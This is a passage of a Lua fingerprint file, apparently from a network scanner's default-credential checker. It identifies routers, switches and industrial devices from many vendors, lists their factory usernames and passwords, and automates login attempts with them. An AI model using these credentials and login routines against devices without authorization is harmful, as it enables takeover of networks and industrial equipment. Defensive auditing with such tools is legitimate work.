  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "TP-Link (basic auth)",
  cpe = "cpe:/o:tp-link:lm_firmware",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 401
           and (http_auth_realm(response) or ""):find("^TP%-LINK")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "TP-Link (MD5 cookie)",
  cpe = "cpe:/o:tp-link:lm_firmware",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and (http_auth_realm(response) or ""):find("^TP%-LINK")
           and response.body
           and response.body:find("%spassword%s*=%s*hex_md5")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local auth = base64.enc(user .. ":" .. stdnse.tohex(openssl.md5(pass)))
    local cookie = "Authorization=" .. url.escape("Basic " .. auth)
    local resp = http_get_simple(host, port,
                                url.absolute(path, "userRpm/LoginRpm.htm?Save=Save"),
                                {cookies=cookie})
    return resp.status == 200
           and (resp.body or ""):find(">window%.parent%.location%.href%s*=%s*(['\"])[^'\"]-/userRpm/Index%.htm%1")
  end
})

table.insert(fingerprints, {
  name = "TP-Link (plain cookie)",
  cpe = "cpe:/o:tp-link:lm_firmware",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (http_auth_realm(response) or ""):find("^TP%-LINK")
           and response.body
           and not response.body:find("%spassword%s*=%s*hex_md5")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local auth = base64.enc(user .. ":" .. pass)
    local cookie = "Authorization=" .. url.escape("Basic " .. auth)
    local resp = http_get_simple(host, port, path, {cookies=cookie})
    return resp.status == 200
           and (resp.body or ""):find("%shref%s*=%s*(['\"])[^'\"]-/userRpm/LogoutRpm%.htm%1")
  end
})

table.insert(fingerprints, {
  name = "Comtrend NexusLink-5631",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "DSL Router"
  end,
  login_combos = {
    {username = "apuser", password = "apuser"},
    {username = "root", password = "12345"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "iBall Baton",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^iBall Baton ")
  end,
  login_combos = {
    {username = "admin",   password = "admin"},
    {username = "support", password = "support"},
    {username = "user",    password = "user"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Link-Net LW/LWH router",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 302
           and (response.header["location"] or ""):find("/home%.asp$")) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "home.asp"))
    return resp.status == 200
           and resp.body
           and resp.body:find("LINK-NET", 1, true)
           and resp.body:find("%svendor%s*=%s*(['\"])LINK%-NET%1")
           and resp.body:lower():find("[%s>]wireless router</title>")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "internet/wan.asp"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Planex Broad Lanner",
  cpe = "cpe:/h:planex:brl-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Planex Communications", 1, true)
           and get_tag(response.body, "meta", {content="^B%a%a%-04FM%a HTML"})
           and get_tag(response.body, "frame", {src="^top%.htm$"})
  end,
  login_combos = {
    {username = "", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "top.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "TrendChip ADSL Modem",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "ADSL Modem"
           and (response.header["server"] or ""):find("^Boa/%d+%.")
           and get_cookie(response, "SESSIONID", "^%x+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = "1234"},
    {username = ("qwertyuiop"):rep(13):sub(1, 128),
        password = ("1234567890"):rep(13):sub(1, 128)},
    {username = "user3",
        password = ("1234567890"):rep(13):sub(1, 128)},
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not resp1.status then return false end
    local auth = {username = user, password = pass}
    local resp2 = http_get_simple(host, port, path,
                                 {auth=auth, cookies=resp1.cookies})
    return resp2.status == 200
  end
})

table.insert(fingerprints, {
  name = "Westell",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/htmlV/PasswordChange%.asp$")
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "htmlV/PasswordChange.asp"),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Yamaha RT 10.x",
  cpe = "cpe:/o:yahama:rt*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local lurl = response.status == 200
                 and get_refresh_url(response.body or "", "/user/index[_%a]*.html$")
    if not lurl then return false end
    local resp = http_get_simple(host, port, lurl)
    return (http_auth_realm(resp) or ""):find("^YAMAHA%-RT ")
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port, path)
    local lurl = resp.status == 200
                 and get_refresh_url(resp.body or "", "/user/index[_%a]*.html$")
    if not lurl then return false end
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Yamaha RT 11.x",
  cpe = "cpe:/o:yahama:rt*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^YAMAHA%-RT ")
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Yamaha SWX",
  category = "routers",
  paths = {
    {path = "/login.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Yamaha Corporation", 1, true)
           and get_tag(response.body, "form", {action="/goform/authenticate%.json$"})
           and get_tag(response.body, "input", {name="^URL$", value="/dashboard/index%.html$"})
  end,
  login_combos = {
    {username="", password=""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {URL=url.absolute(path, "/dashboard/index.html"),
                  USER=user,
                  PASS=pass}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "goform/authenticate.json"),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.result == "SUCCESS"
  end
})

table.insert(fingerprints, {
  name = "Zoom ADSL X5",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 301
           and (response.header["server"] or ""):find("^Nucleus/%d+%.")
           and (response.header["location"] or ""):find("/hag/pages/home%.htm$")
  end,
  login_combos = {
    {username = "admin", password = "zoomadsl"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "hag/pages/home.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "ZTE F660",
  cpe = "cpe:/h:zte:f660",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("ZTE", 1, true)
           and response.body:lower():find("<title>f660</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local ltoken = resp1.body:match("%WgetObj%(%s*['\"]Frm_Logintoken['\"]%s*%)%.value%s*=%s*['\"](%d+)['\"]%s*;")
    if not ltoken then return false end
    local form = {frashnum="",
                  action="login",
                  Frm_Logintoken=ltoken,
                  Username=user,
                  Password=pass}
    local resp2 = http_post_simple(host, port, path, {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/start%.ghtml$")
  end
})

table.insert(fingerprints, {
  name = "ZTE ZXV10 I5xx",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("ZTE", 1, true)
           and get_tag(response.body, "form", {name="^flogin$", action="^getpage%.gch%?pid=1001$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local stime = resp1.body:match("%Wdocument%.getElementById%(%s*['\"]submittime['\"]%s*%)%.value%s*=%s*['\"](%d+)['\"]%s*;")
    if not stime then return false end
    local form = {submenu=-1,
                  menuPos=-1,
                  nosubmenu=1,
                  nextpage="welcome.gch",
                  nextgch="",
                  nextjs="welcome.js",
                  title="Come In to Configuration",
                  path="Welcome",
                  submittime=stime,
                  tUsername=user,
                  tPassword=pass}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "getpage.gch?pid=1001"),
                                  nil, form)
    return resp2.status == 200
           and (resp2.body or ""):lower():find("<title>[^<]-configuration")
  end
})

table.insert(fingerprints, {
  name = "ZTE ZXV10 W300",
  cpe = "cpe:/o:zte:zxv10_w300_firmware",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^ZXV10 W300$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "3Com OfficeConnect VPN Firewall",
  cpe = "cpe:/h:3com:3cr870-95",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("3Com", 1, true)
           and response.body:find("%Wtop%.document%.location%s*=%s*(['\"])[^'\"]-/default%.htm%1")
           and get_tag(response.body, "meta", {["http-equiv"]="^3cnumber$"})
  end,
  login_combos = {
    {username = "", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/admin?page=x"),
                                 nil, {AdminPassword=pass,next=10,page="x"})
    return resp.status == 200
           and get_tag(resp.body or "", "input", {name="^tk$"})
  end
})

table.insert(fingerprints, {
  name = "Corega",
  cpe = "cpe:/o:corega:cg-*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:find("^CG%-%u*BAR")
           or realm:find("^corega BAR ")
  end,
  login_combos = {
    {username = "root", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Netgear ProSafe Firewall FVS318",
  cpe = "cpe:/h:netgear:fvs318",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Netgear"
           and response.body
           and get_tag(response.body, "frame", {src="^top%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "top.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Netgear Router (legacy)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^R[PT][13]1[14]$")
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Netgear Router",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:find("^NETGEAR %u+%d+[%w-]+%s*$")
           or realm == "Netgear"
           or realm == "FR114P"
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Netgear ProSafe Plus Switch",
  cpe = "cpe:/h:netgear:gs108*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("loginTData", 1, true)
           and response.body:lower():find("<title>netgear ", 1, true)
  end,
  login_combos = {
    {username = "", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "login.cgi"),
                                 nil, {password=pass})
    return resp.status == 200 and get_cookie(resp, "GS108SID", ".")
  end
})

table.insert(fingerprints, {
  name = "Netgear Smart Switch",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("document.forms[0].pwd.focus();", 1, true)
           and response.body:lower():find("%saction%s*=%s*(['\"])[^'\"]-/base/%w+_login%.html%1")
           and response.body:lower():find("<title>netgear ", 1, true)
  end,
  login_combos = {
    {username = "", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local lurl = resp1.body:match("['\"]([^'\"]-/base/%w+_login%.html)")
    if not lurl then return false end
    local button = lurl:find("main_login", 1, true) and "" or "_button"
    local form = {pwd=pass,
                  ["login" .. button .. ".x"]=0,
                  ["login" .. button .. ".y"]=0,
                  err_flag=0,
                  err_msg=""}
    local resp2 = http_post_simple(host, port, lurl, nil, form)
    return resp2.status == 200 and get_cookie(resp2, "SID", ".")
  end
})

table.insert(fingerprints, {
  name = "Netgear Intelligent Edge",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("document.forms[0].uname.focus();", 1, true)
           and response.body:lower():find("%saction%s*=%s*(['\"])[^'\"]-/base/%w+_login%.html%1")
           and response.body:lower():find("<title>netgear ", 1, true)
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local lurl = resp1.body:match("['\"]([^'\"]-/base/%w+_login%.html)")
    if not lurl then return false end
    local form = {uname=user,
                  pwd=pass,
                  ["login_button.x"]=0,
                  ["login_button.y"]=0,
                  err_flag=0,
                  err_msg="",
                  submt=""}
    local resp2 = http_post_simple(host, port, lurl, nil, form)
    return resp2.status == 200 and get_cookie(resp2, "SID", ".")
  end
})

table.insert(fingerprints, {
  name = "Netgear Gigabit Enterprise Switch",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/base/web_main.html", 1, true)
           and response.body:lower():find("<title>netgear system login</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "base/web_main.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "PLANET Smart Gigabit Switch",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">Welcome to PLANET ", 1, true)
           and get_tag(response.body, "form", {action="/pass$"})
  end,
  login_combos = {
    {username = "", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {password=pass,
                  x=0,
                  y=0}
    local resp = http_post_simple(host, port, url.absolute(path, "pass"),
                                 nil, form)
    if not (resp.status == 200
           and get_tag(resp.body or "", "frame", {src="/planet%.htm$"})) then
      return false
    end
    http_get_simple(host, port, url.absolute(path, "logout?submit=Apply"))
    return true
  end
})

table.insert(fingerprints, {
  name = "PLANET Managed Switch (var.1)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local server = response.header["server"] or ""
    return (http_auth_realm(response) or ""):find("^Loging?$")
           and (server == "Vitesse Web Server"
             or server == "WebServer")
           and response.body
           and response.body:find(">Authorization required to access this URL.<", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "PLANET Managed Switch (var.2)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local loc = (response.header["location"] or ""):gsub("^https?://[^/]*", "")
    if not (response.status == 302
           and loc:find("/default%.html$")) then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find("1366X768", 1, true)
           and resp.body:lower():find("<title>switch web management (1366x768 is recommended)</title>", 1, true)
           and get_tag(resp.body, "form", {action="/goform/WebSetting%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {name=user,
                  pwd=pass,
                  app="login"}
    local resp = http_post_simple(host, port,
                                  url.absolute(path, "goform/WebSetting.html"),
                                  nil, form)
    return resp.status == 203
           and resp.body
           and get_tag(resp.body, "frame", {src="/frontboard%.html$"})
  end
})

table.insert(fingerprints, {
  name = "PLANET Managed Switch (var.3)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/cgi-bin/get.cgi?cmd=portlink&lg=", 1, true)
           and get_tag(response.body, "frame", {src="/cgi%-bin/get%.cgi%?cmd=portlink&lg=%w+$"})
           and response.body:lower():find("<title>managed switch</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "cgi-bin/get.cgi?cmd=portlink&lg=en"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "PLANET Wireless Router",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("PLANET Technology", 1, true)
           and response.body:find("(['\"])dataCenter%.js%1")
           and response.body:find("%Wauth_action%s*:%s*(['\"])login%1")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username=user,
                  password=base64.enc(pass:gsub("%s", "@")),
                  getPage="index.html",
                  action="Apply",
                  auth_action="login",
                  mode="AUTH",
                  _flg=0}
    local resp = http_post_simple(host, port,
                                  url.absolute(path, "postCenter.js"),
                                  nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body:gsub("'", "\""))
    if not (jstatus and jout.result == "0") then return false end
    http_get_simple(host, port, url.absolute(path, "login.html"))
    return true
  end
})

table.insert(fingerprints, {
  name = "Rubytech chassis",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("fake_server.html", 1, true)
           and get_tag(response.body, "form", {action="^fake_server%.html$"})
           and get_tag(response.body, "input", {name="^textpass$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = stdnse.output_table()
    form.textuser=user
    form.textpass=pass
    form.Submit="Login"
    form.randstr=math.random()
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "fake_server.html"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("%Wlocation%.href%s*=%s*['\"][^'\"]-/main_frame%.html%?")
  end
})

table.insert(fingerprints, {
  name = "ZyXEL Prestige",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response) or ""
    return realm:find("^Prestige ")
           or realm:find("^P[%u-]*645ME")
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "ZyXEL ZyWALL (var.1)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and (response.header["server"] or ""):find("^RomPager/%d+%.")
           and response.body
           and response.body:find("rpAuth.html", 1, true)
           and response.body:find("%WchangeURL%(%s*(['\"])[^'\"]-%f[%w]rpAuth%.html%1%s*%)")
  end,
  login_combos = {
    {username = "", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {LoginPassword="ZyXEL ZyWALL Series",
                  hiddenPassword=stdnse.tohex(openssl.md5(pass)),
                  Prestige_Login="Login"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "Forms/rpAuth_1"),
                                 nil, form)
    return resp.status == 303
           and (resp.header["location"] or ""):find("/passWarning%.html$")
  end
})

table.insert(fingerprints, {
  name = "ZyXEL ZyWALL (var.2)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("ZyWALL", 1, true)
           and response.body:lower():find("<title>zywall %w")
           and get_tag(response.body, "input", {name="^pwd_r$"})
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username=user,
                  pwd=pass,
                  pwd_r="",
                  password=pass}
    local resp = http_post_simple(host, port, path, nil, form)
    return resp.status == 302
           and resp.header["location"] == "ext-js/web-pages/login/chgpw.html"
           and get_cookie(resp, "authtok", "^[%w+-]+$")
  end
})

table.insert(fingerprints, {
  name = "Adtran NetVanta",
  cpe = "cpe:/h:adtran:netvanta_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^NetVanta %d+%f[ \0]")
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Siemens Gigaset SX762/763",
  cpe = "cpe:/h:siemens:gigaset_sx76*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 303
           and (response.header["server"] or ""):find("^SiemensGigaset%-Server/%d+%.")
           and (response.header["location"] or ""):find("/UE/welcome_login%.html$")
  end,
  login_combos = {
    {username = "", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {form_submission_type="login",
                  form_submission_parameter="",
                  current_page="welcome_login.html",
                  next_page="home_security.html",
                  i=1,
                  admin_role_name="administrator",
                  operator_role_name="operator",
                  subscriber_role_name="subscriber",
                  choose_role=0,
                  your_password=pass,
                  Login="OK"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "UE/ProcessForm"),
                                 nil, form)
    return resp.status == 303
           and (resp.header["location"] or ""):find("/UE/home_security%.html$")
  end
})

table.insert(fingerprints, {
  name = "Siemens Scalance X-200",
  cpe = "cpe:/o:siemens:scalance_x-200_series_firmware",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and get_cookie(response, "siemens_ad_session", "^%x+")
           and response.body
           and response.body:find(" SCALANCE X ", 1, true)
           and get_tag(response.body, "input", {name="^nonceA$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "user",  password = "user"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local nonce = get_tag(resp1.body, "input", {name="^nonceA$", value="^%x+$"})
    if not nonce then return false end
    local auth = stdnse.tohex(openssl.md5(table.concat({user, pass, nonce.value}, ":")))
    local resp2 = http_post_simple(host, port, path, {cookies=resp1.cookies},
                                  {encoded=user..":"..auth, nonceA=nonce.value})
    return resp2.status == 200
           and (resp2.body or ""):find("%Wlocation%.href%s*=%s*(['\"])index1%.html%1")
  end
})

table.insert(fingerprints, {
  name = "Siemens Scalance M873/M875",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^SCALANCE M%-?87%d%f[%D]")
  end,
  login_combos = {
    {username = "admin", password = "scalance"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Siemens RUGGEDCOM WIN",
  cpe = "cpe:/h:siemens:ruggedcom_win*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == ""
           and get_cookie(response, "sessionId", "^%d+$")
           and (response.header["server"] or ""):find("^BS/%d+%.")
  end,
  login_combos = {
    {username = "admin", password = "generic"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not get_cookie(resp1, "sessionId", "^%d+$") then return false end
    local resp2 = http_get_simple(host, port, path,
                                  {cookies=resp1.cookies,
                                  auth={username=user,password=pass}})
    return resp2.status == 200
           and get_refresh_url(resp2.body, "/0/m%d+$")
  end
})

table.insert(fingerprints, {
  name = "Siemens RUGGEDCOM ROS (var.1)",
  cpe = "cpe:/o:siemens:ruggedcom_rugged_operating_system",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local loc = (response.header["location"] or ""):gsub("^https?://[^/]*", "")
    if not (response.status == 302
           and loc:find("/InitialPage%.asp$")) then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find("RuggedSwitch Operating System", 1, true)
           and get_tag(resp.body, "a", {href="^Menu%.asp%?UID=%d+$"})
  end,
  login_combos = {
    {username = "admin",    password = "admin"},
    {username = "operator", password = "operator"},
    {username = "guest",    password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port,
                                 url.absolute(path, "InitialPage.asp"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local llink = get_tag(resp1.body, "a", {href="^Menu%.asp%?UID=%d+$"})
    if not llink then return false end
    local lurl = url.absolute(path, llink.href)
    local resp2 = http_get_simple(host, port, lurl)
    if resp2.status ~= 401 then return false end
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Siemens RUGGEDCOM ROS (var.2)",
  cpe = "cpe:/o:siemens:ruggedcom_rugged_operating_system",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local loc = (response.header["location"] or ""):gsub("^https?://[^/]*", "")
    if not (response.status == 302
           and loc:find("/InitialPage%.asp$")) then
      return false
    end
    local resp = http_get_simple(host, port, loc)
    return resp.status == 200
           and resp.body
           and resp.body:find("goahead.gif", 1, true)
           and resp.body:find("LogIn", 1, true)
           and get_tag(resp.body, "form", {action="/goform/postLoginData%?UID=%d+$"})
  end,
  login_combos = {
    {username = "admin",    password = "admin"},
    {username = "operator", password = "operator"},
    {username = "guest",    password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port,
                                 url.absolute(path, "InitialPage.asp"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local frm = get_tag(resp1.body, "form", {action="/goform/postLoginData%?UID=%d+$"})
    if not frm then return false end
    local form = {User=user,
                  Password=pass,
                  choice="LogIn"}
    local resp2 = http_post_simple(host, port, url.absolute(path, frm.action),
                                  nil, form)
    return (resp2.status == 203 or resp2.status == 200)
           and get_tag(resp2.body or "", "a", {href="/logout%.asp%?uid=%d+$"})
  end
})

table.insert(fingerprints, {
  name = "Siemens RUGGEDCOM ROX",
  category = "routers",
  paths = {
    {path = "/login.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/skins/macified/styles/master.css", 1, true)
           and response.body:find("confdLogin();", 1, true)
           and get_tag(response.body, "a", {onclick="^confdlogin%(%);"})
           and get_tag(response.body, "body", {onload="^loadbannercontent%(%);"})
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "oper",  password = "oper"},
    {username = "guest", password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "confd/login"),
                                 nil, {user=user,passwd=pass})
    return resp.status == 200
           and (resp.body or ""):find("^(['\"])sess%d+%1$")
  end
})

table.insert(fingerprints, {
  name = "VideoFlow DVP",
  category = "routers",
  paths = {
    {path = "/login.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/skins/macified/styles/master.css", 1, true)
           and response.body:find("confdLogin();", 1, true)
           and get_tag(response.body, "a", {onclick="^confdlogin%(%);"})
           and get_tag(response.body, "body", {onload="^document%.form%.username%.focus%(%);"})
  end,
  login_combos = {
    {username = "root",    password = "videoflow"},
    {username = "admin",   password = "admin"},
    {username = "oper",    password = "oper"},
    {username = "private", password = "private"},
    {username = "public",  password = "public"},
    {username = "devel",   password = "leved"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "confd/login"),
                                 nil, {user=user,passwd=pass})
    return resp.status == 200
           and (resp.body or ""):find("^(['\"])sess%d+%1$")
  end
})

table.insert(fingerprints, {
  name = "Foxconn Femtocell",
  category = "routers",
